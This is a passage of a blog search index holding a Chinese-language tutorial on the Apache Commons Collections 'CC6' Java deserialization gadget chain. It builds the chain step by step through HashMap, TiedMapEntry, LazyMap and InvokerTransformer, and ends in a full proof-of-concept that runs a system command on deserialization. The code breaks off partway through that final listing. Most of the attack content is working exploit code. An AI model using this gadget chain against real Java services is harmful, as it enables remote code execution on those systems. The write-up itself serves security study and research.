<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java反序列化CC链6</title>
      <link href="/2025/05/24/JavaCC%E9%93%BE6/"/>
      <url>/2025/05/24/JavaCC%E9%93%BE6/</url>
      
        <content type="html"><![CDATA[<h1 id="使用限制"><a href="#使用限制" class="headerlink" title="使用限制"></a>使用限制</h1><p>不限制jdk版本，CC库小于等于3.2.1均可利用</p><h1 id="CC利用链分析"><a href="#CC利用链分析" class="headerlink" title="CC利用链分析"></a>CC利用链分析</h1><h2 id="前情回顾"><a href="#前情回顾" class="headerlink" title="前情回顾"></a>前情回顾</h2><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>根据之前对CC链1的分析，我们知道可以通过<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">ChainedTransformer配合InvokerTransformer实现命令执行。详细的解析可以看我之前的一篇文章：</font><a href="https://hadagaga.github.io/2025/05/15/JavaCC%E9%93%BE1/%EF%BC%8C%E4%B8%8B%E9%9D%A2%E4%B8%80%E5%B0%8F%E6%AE%B5%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A">https://hadagaga.github.io/2025/05/15/JavaCC%E9%93%BE1/，下面一小段示例代码：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">ct.transform(<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="高版本JDK的修改"><a href="#高版本JDK的修改" class="headerlink" title="高版本JDK的修改"></a>高版本JDK的修改</h3><p>自JDK8u_71后，<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">AnnotationInvocationHandler类被重写，其中的readObject方法被修改，没有了对setvalue方法的调用。下图是JDK17.0.4中sun.reflect.annotation.AnnotationInvocationHandler类中的readObject方法，可以看到其中的setvalue已经被修改为setmember。</font></p><p><img src="/img/JavaCC6/1748063005320-a4f8162e-b271-4f4a-aa74-b8173e470a6f.png"></p><p>回顾一下CC1的利用链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()//入口类</span><br><span class="line">    -&gt;AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line">        -&gt;TransformedMap.checkSetValue()</span><br><span class="line">            -&gt;ChainedTransformer.transform()</span><br><span class="line">                -&gt;InvokerTransformer.transform()//执行类</span><br></pre></td></tr></table></figure><p>可以看到，我们的利用链由于setValue的消失，导致利用链断裂。所以我们就要找一个新的利用链。</p><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="1-LazyMap"><a href="#1-LazyMap" class="headerlink" title="1.LazyMap"></a>1.LazyMap</h2><p>我们查找<font style="color:#080808;background-color:#ffffff;">ChainedTransformer类中的</font>transform方法的用法，找到了在LazyMap类中的get方法中存在一个对transform方法的调用。</p><p><img src="/img/JavaCC6/1748063397584-d06349c3-d1a9-4c14-9b67-9d13573579e7.png"></p><p>LazyMap中的关键方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过decorate方法创建一个对象，然后通过LazyMap的get方法调用<font style="color:#080808;background-color:#ffffff;">ChainedTransformer类中的transform方法。</font></p><p><font style="color:#080808;background-color:#ffffff;">示例代码如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), ct);</span><br><span class="line">lazymap.get(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么接下来我们就需要去寻找一个调用了get方法的方法。</p><h2 id="2-TiedMapEntry"><a href="#2-TiedMapEntry" class="headerlink" title="2.TiedMapEntry"></a>2.<font style="color:#080808;background-color:#ffffff;">TiedMapEntry</font></h2><p><font style="color:#080808;background-color:#ffffff;"> </font><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">ysoserial的作者找到了TiedMapEntry这条链，TiedMapEntry关键代码如下</font></p><p><img src="/img/JavaCC6/1748064111670-c678043e-ed28-4251-9e7d-4542c75aeb85.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个类中的hashCode方法中，调用了getValue方法，而getValue方法又调用了get方法。所以我们就可以利用<font style="color:#080808;background-color:#ffffff;">TiedMapEntry类中的hashCode方法去调用LazyMap中的get方法。</font></p><p><font style="color:#080808;background-color:#ffffff;">示例代码如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), ct);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">entry.hashCode();</span><br></pre></td></tr></table></figure><p>接下来再寻找一个调用了hashcode方法的方法。</p><h2 id="3-HashMap"><a href="#3-HashMap" class="headerlink" title="3.HashMap"></a>3.HashMap</h2><p>还记得之前研究过的URLDNS链吗？在HashMap的hash方法中有如下的代码</p><p><img src="/img/JavaCC6/1748064611315-f18972ec-dd53-48be-a33c-18e50691b5b6.png"></p><p>这里调用了hashCode方法，而hash方法又被readObject方法调用</p><p><img src="/img/JavaCC6/1748064712618-55522444-32b1-41f1-90f0-785a18e259f6.png"></p><p>所以到现在我们的入口类就可以确定下来了。</p><p>调用示例代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), ct);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="利用链调整"><a href="#利用链调整" class="headerlink" title="利用链调整"></a>利用链调整</h1><h2 id="1-HashMap中的put导致提前命令执行"><a href="#1-HashMap中的put导致提前命令执行" class="headerlink" title="1.HashMap中的put导致提前命令执行"></a>1.HashMap中的put导致提前命令执行</h2><p>由于HashMap的put方法会调用hash方法，导致在序列化前就进行了命令执行，所以这里我们修改一下代码。</p><p>这里我们在新建LazyMap对象时，随意传入一个Transformer对象，等put完成后再通过反射修改为<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">ChainedTransformer对象。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure><p>再通过反射修改factory值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(lazymap, ct);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化。</p><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">    serialize(hashMap);</span><br><span class="line">    unserialize(<span class="string">&quot;D://CC6.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">    objectInputStream.readObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D://CC6.txt&quot;</span>));</span><br><span class="line">    oos.writeObject(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，但是发现没有进行命令执行。</p><h2 id="2-LazyMap中的get判断不通过"><a href="#2-LazyMap中的get判断不通过" class="headerlink" title="2.LazyMap中的get判断不通过"></a>2.LazyMap中的get判断不通过</h2><p>我们先梳理一下我们的利用链：通过HashMap的put方法调用hash方法，hash方法调用hashCode方法，进而执行<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">tiedMapEntry中的hashCode方法，之后就会执行LazyMap中的get方法。</font></p><p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">debug一下，一直定位到LazyMap的get方法，发现这里if判断不通过，导致了不调用transform方法。</font></p><p><img src="/img/JavaCC6/1748066228210-8a8bd3d4-176b-4fe1-82eb-d6d6c00c5d27.png"></p><p>但在此之前我们并没有传入key为2的数据，为什么会这样？问题还是出现在get方法中。</p><p>在序列化前的操作中，如果map没有包含这个key，那么就会给map传入这个键值对。</p><p>这就会导致在反序列化是由于已经存在了这个key，因此就不会执行transform方法，使得无法命令执行。</p><p><img src="/img/JavaCC6/1748066411361-4146560d-80e0-417c-9842-835e83ca09e5.png"></p><p>解决方法也很简单，put完之后删除这个key就行了。在put后添加如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure><p>再次执行就可以成功命令执行了。</p><h1 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;HashMap.readObject()//入口类</span><br><span class="line">    -&gt;HashMap.<span class="built_in">hash</span>()</span><br><span class="line">        -&gt;TiedMapEntry.hashCode()</span><br><span class="line">            -&gt;TiedMapEntry.getValue()</span><br><span class="line">                -&gt;LazyMap.get()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()//执行类</span><br></pre></td></tr></table></figure><h1 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h1><p>完整代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;D://CC6.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title 